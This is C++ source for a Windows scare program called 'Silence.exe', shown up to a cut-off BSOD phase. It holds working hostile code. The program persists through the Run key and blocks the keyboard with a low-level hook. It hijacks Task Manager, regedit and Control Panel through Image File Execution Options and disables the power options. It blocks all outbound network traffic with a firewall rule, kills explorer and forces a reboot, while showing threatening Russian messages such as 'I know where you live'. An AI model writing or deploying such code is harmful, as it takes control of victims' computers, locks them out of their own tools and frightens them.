#pragma execution_character_set("utf-8")
#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <mmsystem.h>
#include <shellapi.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <cstdio>
#include <cstring>
#include <cwchar>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:wWinMainCRTStartup")

// ============================================================
// КОНФИГ
// ============================================================
namespace Cfg {
    constexpr int kTimerPhaseMs = 120000;   // 2 мин таймер
    constexpr int kMaxPrankMs   = 600000;
    constexpr int kGlitchMs     = 1000;
    constexpr int kPhase14Ms    = 1800000;  // 30 минут "он всё ещё здесь"
}

// ============================================================
// ГЛОБАЛЫ
// ============================================================
std::atomic<bool> g_stop{false};
std::atomic<bool> g_audioStop{false};
std::atomic<int>  g_volume{40};
std::atomic<int>  g_effectLevel{0};
std::atomic<bool> g_helpUserClose{false};
std::atomic<bool> g_cursorLagOn{false};

HHOOK     g_kbHook = nullptr;
HINSTANCE g_hInst  = nullptr;

DEVMODEW g_oldDevMode = {};
bool     g_resolutionChanged = false;
bool     g_runningAsLogonUI  = false;

std::vector<HWND> g_errorWindows;

// ============================================================
// ТЕКСТЫ
// ============================================================
const wchar_t* kSilenceErrors[] = {
    L"не оборачивайся",
    L"не пытайся ничего сделать даже",
    L"я знаю",
    L"уже поздно",
    L"осталось недолго",
    L"не закрывай глаза",
    L"я рядом",
    L"ты слышишь?",
    L"не молчи",
    L"я вижу тебя"
};
constexpr int kSilenceErrorsCount = 10;

// ============================================================
// РЕЕСТР
// ============================================================
bool GetRegDword(HKEY root, const wchar_t* subkey, const wchar_t* value, DWORD* out) {
    HKEY h;
    if (RegOpenKeyExW(root, subkey, 0, KEY_READ, &h) != ERROR_SUCCESS) return false;
    DWORD sz = sizeof(DWORD), type = 0;
    bool ok = RegQueryValueExW(h, value, nullptr, &type, (LPBYTE)out, &sz) == ERROR_SUCCESS
              && type == REG_DWORD;
    RegCloseKey(h);
    return ok;
}

bool SetRegDword(HKEY root, const wchar_t* subkey, const wchar_t* value, DWORD data) {
    HKEY h;
    DWORD disp;
    if (RegCreateKeyExW(root, subkey, 0, nullptr, 0, KEY_SET_VALUE,
                        nullptr, &h, &disp) != ERROR_SUCCESS) return false;
    bool ok = RegSetValueExW(h, value, 0, REG_DWORD,
                             (const BYTE*)&data, sizeof(data)) == ERROR_SUCCESS;
    RegCloseKey(h);
    return ok;
}

bool SetRegString(HKEY root, const wchar_t* subkey, const wchar_t* value, const wchar_t* data) {
    HKEY h;
    DWORD disp;
    if (RegCreateKeyExW(root, subkey, 0, nullptr, 0, KEY_SET_VALUE,
                        nullptr, &h, &disp) != ERROR_SUCCESS) return false;
    bool ok = RegSetValueExW(h, value, 0, REG_SZ,
                             (const BYTE*)data,
                             (DWORD)((wcslen(data)+1)*sizeof(wchar_t))) == ERROR_SUCCESS;
    RegCloseKey(h);
    return ok;
}

bool GetRegString(HKEY root, const wchar_t* subkey, const wchar_t* value,
                  wchar_t* out, DWORD outSize) {
    HKEY h;
    if (RegOpenKeyExW(root, subkey, 0, KEY_READ, &h) != ERROR_SUCCESS) return false;
    DWORD sz = outSize;
    bool ok = RegQueryValueExW(h, value, nullptr, nullptr,
                               (LPBYTE)out, &sz) == ERROR_SUCCESS;
    RegCloseKey(h);
    return ok;
}

int GetPhase() {
    DWORD v = 0;
    if (GetRegDword(HKEY_CURRENT_USER, L"Software\\Silence", L"Phase", &v)) return (int)v;
    return 0;
}
void SetPhase(int p) {
    SetRegDword(HKEY_CURRENT_USER, L"Software\\Silence", L"Phase", (DWORD)p);
}

// ============================================================
// УТИЛИТЫ
// ============================================================
void PumpMessages() {
    MSG m;
    while (PeekMessageW(&m, nullptr, 0, 0, PM_REMOVE)) {
        TranslateMessage(&m); DispatchMessageW(&m);
    }
}
void SleepPump(int ms) {
    DWORD s = GetTickCount();
    while ((int)(GetTickCount() - s) < ms && !g_stop.load()) {
        PumpMessages(); Sleep(10);
    }
}

bool IsElevated() {
    HANDLE t = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) return false;
    TOKEN_ELEVATION e = {}; DWORD sz = sizeof(e);
    bool ok = GetTokenInformation(t, TokenElevation, &e, sz, &sz) && e.TokenIsElevated;
    CloseHandle(t);
    return ok;
}
void RelaunchElevated() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    SHELLEXECUTEINFOW sei = {};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"runas";
    sei.lpFile = path;
    sei.nShow  = SW_SHOW;
    ShellExecuteExW(&sei);
}

// ============================================================
// КЛАВИАТУРА
// ============================================================
LRESULT CALLBACK LLKeyboardProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN ||
                           w == WM_KEYUP   || w == WM_SYSKEYUP)) return 1;
    return CallNextHookEx(g_kbHook, n, w, l);
}
void InstallKbHook() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LLKeyboardProc, nullptr, 0);
}
void RemoveKbHook() {
    if (g_kbHook) { UnhookWindowsHookEx(g_kbHook); g_kbHook = nullptr; }
}

// ============================================================
// ПАНЕЛЬ ЗАДАЧ
// ============================================================
void HideTaskbar() {
    HWND t = FindWindowW(L"Shell_TrayWnd", nullptr);
    if (t) ShowWindow(t, SW_HIDE);
}
void ShowTaskbar() {
    HWND t = FindWindowW(L"Shell_TrayWnd", nullptr);
    if (t) ShowWindow(t, SW_SHOW);
}

// ============================================================
// BYTEBEAT
// ============================================================
static inline DWORD BytebeatSample(DWORD t) {
    DWORD bass      = t >> 13;
    DWORD noise     = (t * (t >> 4)) & 0x1F;
    DWORD intensity = (t >> 18) & 0xFF;
    return (bass + (noise * intensity)) & 0xFF;
}
static inline DWORD BytebeatBSOD(DWORD t) {
    DWORD pulse = (t >> 9) & 1;
    DWORD bass  = (t >> 6) & 0x3F;
    return (bass * (pulse ? 2 : 1) + 128) & 0xFF;
}
static inline DWORD BytebeatPhase14(DWORD t) {
    DWORD a = (t >> 10) & 1;
    DWORD b = (t >> 14) & 1;
    return ((a ^ b) ? 40 : 0) + 128;
}

// ============================================================
// AUDIO THREAD
// ============================================================
void AudioThread(DWORD (*fn)(DWORD), int durationMs, bool loop) {
    const int SR  = 8000;
    const int BUF = 1024;
    const int N   = 4;

    WAVEFORMATEX wf = {};
    wf.wFormatTag      = WAVE_FORMAT_PCM;
    wf.nChannels       = 1;
    wf.nSamplesPerSec  = SR;
    wf.wBitsPerSample  = 8;
    wf.nBlockAlign     = 1;
    wf.nAvgBytesPerSec = SR;

    HWAVEOUT h = nullptr;
    if (waveOutOpen(&h, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) return;

    std::vector<unsigned char> samp(N * BUF);
    std::vector<WAVEHDR> hdr(N);
    for (int i = 0; i < N; ++i) {
        hdr[i] = {};
        hdr[i].lpData = (LPSTR)&samp[i * BUF];
        hdr[i].dwBufferLength = BUF;
        waveOutPrepareHeader(h, &hdr[i], sizeof(WAVEHDR));
    }

    DWORD t = 0;
    int cb = 0;
    DWORD start = GetTickCount();

    while (loop || (int)(GetTickCount() - start) < durationMs) {
        if (g_audioStop.load()) break;
        int guard = 0;
        while (!(hdr[cb].dwFlags & WHDR_DONE)) {
            if (g_audioStop.load()) goto cleanup;
            Sleep(2);
            if (++guard > 500) break;
        }
        int v = g_volume.load();
        unsigned char* buf = (unsigned char*)hdr[cb].lpData;
        for (int i = 0; i < BUF; ++i) {
            DWORD raw = fn(t++);
            int s = (int)raw - 128;
            s = (s * v) / 100;
            if (s > 127) s = 127;
            if (s < -128) s = -128;
            buf[i] = (unsigned char)(s + 128);
        }
        hdr[cb].dwFlags &= ~WHDR_DONE;
        hdr[cb].dwBufferLength = BUF;
        waveOutWrite(h, &hdr[cb], sizeof(WAVEHDR));
        cb = (cb + 1) % N;
    }
cleanup:
    waveOutReset(h);
    for (int i = 0; i < N; ++i) waveOutUnprepareHeader(h, &hdr[i], sizeof(WAVEHDR));
    waveOutClose(h);
}

// ============================================================
// ФАЗА 0 — ГЛИТЧ
// ============================================================
void DoInitialGlitch() {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP bmp = CreateCompatibleBitmap(hScreen, sw, sh);
    HBITMAP old = (HBITMAP)SelectObject(hMem, bmp);
    BitBlt(hMem, 0, 0, sw, sh, hScreen, 0, 0, SRCCOPY);

    DWORD start = GetTickCount();
    while ((int)(GetTickCount() - start) < Cfg::kGlitchMs) {
        for (int i = 0; i < 20; ++i) {
            int srcX = rand() % (sw - 200);
            int srcY = rand() % (sh - 200);
            int bw = 60 + rand() % 300;
            int bh = 40 + rand() % 200;
            int dx = srcX + (rand() % 121) - 60;
            int dy = srcY + (rand() % 121) - 60;
            BitBlt(hScreen, dx, dy, bw, bh, hMem, srcX, srcY, SRCINVERT);
        }
        Sleep(20);
    }
    BitBlt(hScreen, 0, 0, sw, sh, hMem, 0, 0, SRCCOPY);

    SelectObject(hMem, old);
    DeleteObject(bmp);
    DeleteDC(hMem);
    ReleaseDC(nullptr, hScreen);
}

// ============================================================
// ФАЗА 1
// ============================================================
void CreateDesktopFiles() {
    wchar_t desktop[MAX_PATH];
    if (FAILED(SHGetFolderPathW(nullptr, CSIDL_DESKTOPDIRECTORY, nullptr, 0, desktop))) return;

    const wchar_t* msgs[] = {
        L"Я вижу тебя.", L"Не двигайся.", L"Я знаю, где ты живёшь.",
        L"Проверь заднюю дверь.", L"Осталось недолго.",
        L"Ты не должен был это открывать.", L"Бежать бессмысленно.",
        L"Скоро увидимся.", L"Не закрывай глаза.", L"Я уже внутри."
    };
    for (int i = 0; i < 10; ++i) {
        wchar_t path[MAX_PATH];
        swprintf_s(path, L"%s\\message_%02d.txt", desktop, i + 1);
        HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (f != INVALID_HANDLE_VALUE) {
            DWORD wr;
            WriteFile(f, "\xEF\xBB\xBF", 3, &wr, nullptr);
            int wlen = (int)wcslen(msgs[i]);
            int u8len = WideCharToMultiByte(CP_UTF8, 0, msgs[i], wlen, nullptr, 0, nullptr, nullptr);
            std::vector<char> u8(u8len);
            WideCharToMultiByte(CP_UTF8, 0, msgs[i], wlen, u8.data(), u8len, nullptr, nullptr);
            WriteFile(f, u8.data(), u8len, &wr, nullptr);
            CloseHandle(f);
        }
    }
}

void SetBlackWallpaper() {
    wchar_t currentWall[MAX_PATH] = {};
    DWORD sz = sizeof(currentWall);
    HKEY h;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0, KEY_READ, &h) == ERROR_SUCCESS) {
        RegQueryValueExW(h, L"WallPaper", nullptr, nullptr, (LPBYTE)currentWall, &sz);
        RegCloseKey(h);
    }
    if (wcslen(currentWall) > 0) {
        SetRegString(HKEY_CURRENT_USER, L"Software\\Silence", L"OriginalWallpaper", currentWall);
    }
    SetRegDword(HKEY_CURRENT_USER, L"Software\\Silence", L"WallpaperChanged", 1);
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void Phase1_BlackDesktop() {
    SetBlackWallpaper();
    CreateDesktopFiles();
    SleepPump(3000);
}

// ============================================================
// РЕБУТ
// ============================================================
void DoReboot() {
    HANDLE t;
    TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t)) {
        LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(t, FALSE, &tp, 0, nullptr, nullptr);
        CloseHandle(t);
    }
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
}

void InstallToRun() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    SetRegString(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"SilenceService", path);
}

void RemoveFromRun() {
    HKEY h;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) {
        RegDeleteValueW(h, L"SilenceService");
        RegCloseKey(h);
    }
}

// ============================================================
// ФАЗА 3 — ЛОКДАУН
// ============================================================
void BlockIFEO(const wchar_t* exe) {
    wchar_t path[512];
    swprintf_s(path,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s", exe);
    SetRegString(HKEY_LOCAL_MACHINE, path, L"Debugger", L"notepad.exe C:\\Windows\\help_me.txt");
}

void CreateHelpFile() {
    HANDLE f = CreateFileW(L"C:\\Windows\\help_me.txt", GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f != INVALID_HANDLE_VALUE) {
        const char msg[] = "\xEF\xBB\xBF"
            "\xD0\xA2\xD1\x8B \xD0\xBF\xD1\x80\xD0\xB0\xD0\xB2\xD0\xB4\xD0\xB0 "
            "\xD0\xB4\xD1\x83\xD0\xBC\xD0\xB0\xD0\xBB, \xD1\x87\xD1\x82\xD0\xBE "
            "\xD1\x8D\xD1\x82\xD0\xBE \xD0\xBF\xD0\xBE\xD0\xBC\xD0\xBE\xD0\xB6\xD0\xB5\xD1\x82?\n\n"
            "\xD0\x9D\xD0\xB5\xD1\x82.";
        DWORD wr;
        WriteFile(f, msg, (DWORD)strlen(msg), &wr, nullptr);
        CloseHandle(f);
    }
}

void BlockPower() {
    SetRegDword(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"NoClose", 1);
    SetRegDword(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"StartMenuLogOff", 1);
    SetRegDword(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"NoPowerOptions", 1);
}

void BlockInternet() {
    STARTUPINFOW si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    wchar_t cmd[] = L"cmd.exe /c netsh advfirewall set allprofiles state on & "
                    L"netsh advfirewall firewall add rule name=\"SilenceBlock\" dir=out action=block";
    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void ScheduleRestore() {
    const wchar_t* restore =
        L"cmd.exe /c "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe\" /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe\" /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SystemSettings.exe\" /f & "
        L"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /f & "
        L"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /f & "
        L"reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPowerOptions /f & "
        L"netsh advfirewall firewall delete rule name=\"SilenceBlock\"";
    SetRegString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", L"SilenceRestore", restore);
}

void ShowRulesWindow() {
    MSGBOXPARAMSW p = {};
    p.cbSize = sizeof(p);
    p.lpszText =
        L"ТЕБЕ НЕ ПОМОЖЕТ:\n\n"
        L"  ✗ Диспетчер задач\n  ✗ Редактор реестра\n  ✗ Панель управления\n"
        L"  ✗ Параметры Windows\n  ✗ Безопасный режим\n\n"
        L"Мы подумали обо всём.\n\nОсталось недолго.";
    p.lpszCaption = L"Silence.exe";
    p.dwStyle = MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SETFOREGROUND;
    p.dwLanguageId = MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT);
    MessageBoxIndirectW(&p);
}

void Phase3_Lockdown() {
    CreateHelpFile();
    BlockIFEO(L"taskmgr.exe");
    BlockIFEO(L"regedit.exe");
    BlockIFEO(L"control.exe");
    BlockIFEO(L"SystemSettings.exe");
    BlockPower();
    BlockInternet();
    ScheduleRestore();
    SleepPump(500);

    MessageBoxW(nullptr,
        L"Обнаружен вредоносный процесс.\n\nНе выключайте компьютер.",
        L"Silence.exe", MB_OK | MB_ICONERROR | MB_TOPMOST);
    SleepPump(500);
    ShowRulesWindow();
    SetPhase(4);
}

// ============================================================
// ФАЗА 4 — ТАЙМЕР
// ============================================================
LRESULT CALLBACK TimerProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    static DWORD startTime = 0;
    if (m == WM_CREATE) { startTime = GetTickCount(); }
    if (m == WM_ERASEBKGND) return 1;
    if (m == WM_PAINT) {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        int remain = Cfg::kTimerPhaseMs / 1000 - (int)((GetTickCount() - startTime) / 1000);
        if (remain < 0) remain = 0;
        wchar_t timeStr[16];
        swprintf_s(timeStr, L"%02d:%02d", remain / 60, remain % 60);

        double prog = 1.0 - (double)remain / (Cfg::kTimerPhaseMs / 1000);
        int r = (int)(255 * prog);
        int g = 255 - (int)(255 * prog);

        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(200, 200, 200));
        HFONT fs = CreateFontW(18, 0, 0, 0, FW_BOLD, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Consolas");
        HFONT old = (HFONT)SelectObject(dc, fs);
        TextOutW(dc, 15, 10, L"Silence.exe", 11);

        SetTextColor(dc, RGB(r, g, 0));
        HFONT ft = CreateFontW(48, 0, 0, 0, FW_BOLD, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Consolas");
        SelectObject(dc, ft);
        RECT tr = { 15, 40, rc.right - 15, rc.bottom - 10 };
        DrawTextW(dc, timeStr, -1, &tr, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        SelectObject(dc, old);
        DeleteObject(fs); DeleteObject(ft);
        EndPaint(h, &ps);
        return 0;
    }
    if (m == WM_TIMER) { InvalidateRect(h, nullptr, FALSE); return 0; }
    if (m == WM_DESTROY) { KillTimer(h, 1); return 0; }
    return DefWindowProcW(h, m, w, l);
}

void RegisterTimerClass() {
    WNDCLASSW wc = {};
    wc.hInstance = g_hInst; wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.lpfnWndProc = TimerProc; wc.lpszClassName = L"SilenceTimer";
    RegisterClassW(&wc);
}

void Effect_Pixelation(int intensity) {
    if (intensity < 20) return;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    HDC hSmall = CreateCompatibleDC(hScreen);
    int blocks = 240 - (intensity * 2);
    if (blocks < 40) blocks = 40;
    HBITMAP bSmall = CreateCompatibleBitmap(hScreen, blocks, blocks * sh / sw);
    HBITMAP old = (HBITMAP)SelectObject(hSmall, bSmall);
    SetStretchBltMode(hSmall, COLORONCOLOR);
    StretchBlt(hSmall, 0, 0, blocks, blocks * sh / sw, hScreen, 0, 0, sw, sh, SRCCOPY);
    SetStretchBltMode(hScreen, COLORONCOLOR);
    StretchBlt(hScreen, 0, 0, sw, sh, hSmall, 0, 0, blocks, blocks * sh / sw, SRCCOPY);
    SelectObject(hSmall, old); DeleteObject(bSmall); DeleteDC(hSmall);
    ReleaseDC(nullptr, hScreen);
}

void Effect_Glitch(int intensity) {
    if (intensity < 30) return;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    int count = intensity / 10;
    for (int i = 0; i < count; ++i) {
        int srcX = rand() % (sw - 200);
        int srcY = rand() % (sh - 200);
        int bw = 50 + rand() % 200;
        int bh = 30 + rand() % 150;
        int dx = srcX + (rand() % 61) - 30;
        int dy = srcY + (rand() % 61) - 30;
        BitBlt(hScreen, dx, dy, bw, bh, hScreen, srcX, srcY, SRCINVERT);
    }
    ReleaseDC(nullptr, hScreen);
}

void Effect_RedFilter(int intensity) {
    if (intensity < 40) return;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    HDC hRed = CreateCompatibleDC(hScreen);
    HBITMAP bRed = CreateCompatibleBitmap(hScreen, sw, sh);
    HBITMAP old = (HBITMAP)SelectObject(hRed, bRed);
    HBRUSH rb = CreateSolidBrush(RGB(150, 0, 0));
    RECT full = { 0, 0, sw, sh };
    FillRect(hRed, &full, rb);
    DeleteObject(rb);
    BYTE alpha = (BYTE)((intensity - 40) * 40 / 60);
    BLENDFUNCTION bf = { AC_SRC_OVER, 0, alpha, 0 };
    AlphaBlend(hScreen, 0, 0, sw, sh, hRed, 0, 0, sw, sh, bf);
    SelectObject(hRed, old); DeleteObject(bRed); DeleteDC(hRed);
    ReleaseDC(nullptr, hScreen);
}

void Phase4_Timer() {
    RegisterTimerClass();
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int w = 260, h = 120;
    HWND hw = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"SilenceTimer", L"", WS_POPUP | WS_BORDER,
        sw - w - 20, 20, w, h,
        nullptr, nullptr, g_hInst, nullptr);
    ShowWindow(hw, SW_SHOWNOACTIVATE);
    SetTimer(hw, 1, 500, nullptr);
    UpdateWindow(hw);

    g_volume = 40;
    std::thread tAudio(AudioThread, BytebeatSample, 0, true);

    DWORD start = GetTickCount();
    while (!g_stop.load() && (int)(GetTickCount() - start) < Cfg::kTimerPhaseMs) {
        DWORD elapsed = GetTickCount() - start;
        int intensity = (int)(100.0 * elapsed / Cfg::kTimerPhaseMs);
        g_effectLevel = intensity;
        g_volume = 40 + (int)(160.0 * elapsed / Cfg::kTimerPhaseMs);
        Effect_Pixelation(intensity);
        Effect_Glitch(intensity);
        Effect_RedFilter(intensity);
        PumpMessages();
        Sleep(80);
    }

    g_audioStop = true;
    g_volume = 0;
    if (tAudio.joinable()) tAudio.join();
    DestroyWindow(hw);

    HDC hScreen = GetDC(nullptr);
    HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
    RECT full = { 0, 0, sw, sh };
    FillRect(hScreen, &full, black);
    DeleteObject(black);
    ReleaseDC(nullptr, hScreen);
}

// ============================================================
// ФАЗА 6
// ============================================================
void KillExplorer() {
    STARTUPINFOW si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    wchar_t cmd[] = L"cmd.exe /c taskkill /f /im explorer.exe";
    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}
void Phase6_ExplorerKilled() {
    KillExplorer();
    SleepPump(5000);
}

// ============================================================
// ФАЗА 7
// ============================================================
LRESULT CALLBACK HelpProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_ERASEBKGND) return 1;
    if (m == WM_PAINT) {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        HBRUSH bg = CreateSolidBrush(RGB(240, 240, 240));
        FillRect(dc, &rc, bg); DeleteObject(bg);
        HBRUSH tb = CreateSolidBrush(RGB(0, 90, 158));
        RECT tr = { 0, 0, rc.right, 28 }; FillRect(dc, &tr, tb); DeleteObject(tb);
        SetBkMode(dc, TRANSPARENT); SetTextColor(dc, RGB(255, 255, 255));
        HFONT ft = CreateFontW(14, 0, 0, 0, FW_NORMAL, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI");
        HFONT old = (HFONT)SelectObject(dc, ft);
        TextOutW(dc, 8, 6, L"HelpUser.exe", 12);
        HICON hIcon = LoadIconW(nullptr, IDI_INFORMATION);
        DrawIconEx(dc, 20, 50, hIcon, 32, 32, 0, nullptr, DI_NORMAL);
        SetTextColor(dc, RGB(0, 0, 0));
        HFONT fb = CreateFontW(15, 0, 0, 0, FW_NORMAL, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI");
        SelectObject(dc, fb);
        const wchar_t* text =
            L"Я пытаюсь спасти твой компьютер.\n"
            L"Но, походу, всё вышло из-под контроля.\n\n"
            L"Не выключай.\n\nЕсли сможешь — перезагрузись.\n\nПрости.";
        RECT tr2 = { 70, 50, rc.right - 20, rc.bottom - 20 };
        DrawTextW(dc, text, -1, &tr2, DT_LEFT | DT_TOP | DT_WORDBREAK);
        SelectObject(dc, old); DeleteObject(ft); DeleteObject(fb);
        EndPaint(h, &ps);
        return 0;
    }
    if (m == WM_TIMER) { if (g_helpUserClose.load()) DestroyWindow(h); return 0; }
    if (m == WM_DESTROY) { KillTimer(h, 1); return 0; }
    return DefWindowProcW(h, m, w, l);
}

void RegisterHelpClass() {
    WNDCLASSW wc = {};
    wc.hInstance = g_hInst; wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.lpfnWndProc = HelpProc; wc.lpszClassName = L"HelpUserClass";
    RegisterClassW(&wc);
}

void Phase7_HelpUser() {
    RegisterHelpClass();
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int w = 500, h = 280;
    HWND hw = CreateWindowExW(WS_EX_TOPMOST, L"HelpUserClass", L"HelpUser.exe",
        WS_POPUP | WS_BORDER, (sw-w)/2, (sh-h)/2, w, h,
        nullptr, nullptr, g_hInst, nullptr);
    if (!hw) { SleepPump(3000); return; }
    g_helpUserClose = false;
    ShowWindow(hw, SW_SHOW);
    UpdateWindow(hw);
    SetTimer(hw, 1, 200, nullptr);
    SleepPump(5000);
    g_helpUserClose = true;
    PumpMessages();
    SleepPump(500);
    if (IsWindow(hw)) DestroyWindow(hw);
    PumpMessages();
    SleepPump(5000);
}

// ============================================================
// QR-КОД
// ============================================================
void DrawFakeQR(HDC dc, int x, int y, int size) {
    int cells = 29;
    int cell = size / cells;
    int realSize = cell * cells;
    HBRUSH white = CreateSolidBrush(RGB(255, 255, 255));
    RECT bg = { x, y, x + realSize, y + realSize };
    FillRect(dc, &bg, white); DeleteObject(white);
    HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
    HBRUSH whiteIn = CreateSolidBrush(RGB(255, 255, 255));

    RECT m1 = { x, y, x + 7*cell, y + 7*cell }; FillRect(dc, &m1, black);
    RECT m1i = { x + cell, y + cell, x + 6*cell, y + 6*cell }; FillRect(dc, &m1i, whiteIn);
    RECT m1c = { x + 2*cell, y + 2*cell, x + 5*cell, y + 5*cell }; FillRect(dc, &m1c, black);

    RECT m2 = { x + realSize - 7*cell, y, x + realSize, y + 7*cell }; FillRect(dc, &m2, black);
    RECT m2i = { x + realSize - 6*cell, y + cell, x + realSize - cell, y + 6*cell }; FillRect(dc, &m2i, whiteIn);
    RECT m2c = { x + realSize - 5*cell, y + 2*cell, x + realSize - 2*cell, y + 5*cell }; FillRect(dc, &m2c, black);

    RECT m3 = { x, y + realSize - 7*cell, x + 7*cell, y + realSize }; FillRect(dc, &m3, black);
    RECT m3i = { x + cell, y + realSize - 6*cell, x + 6*cell, y + realSize - cell }; FillRect(dc, &m3i, whiteIn);
    RECT m3c = { x + 2*cell, y + realSize - 5*cell, x + 5*cell, y + realSize - 2*cell }; FillRect(dc, &m3c, black);

    for (int cy = 0; cy < cells; ++cy) {
        for (int cx = 0; cx < cells; ++cx) {
            if ((cx < 8 && cy < 8) || (cx >= cells - 8 && cy < 8) ||
                (cx < 8 && cy >= cells - 8)) continue;
            if (rand() % 2) {
                RECT r = { x + cx*cell, y + cy*cell, x + (cx+1)*cell, y + (cy+1)*cell };
                FillRect(dc, &r, black);
            }
        }
    }
    DeleteObject(black); DeleteObject(whiteIn);
}

// ============================================================
// ФАЗА 9+10 — BSOD
// ============================================================
void Phase9_BSOD() {
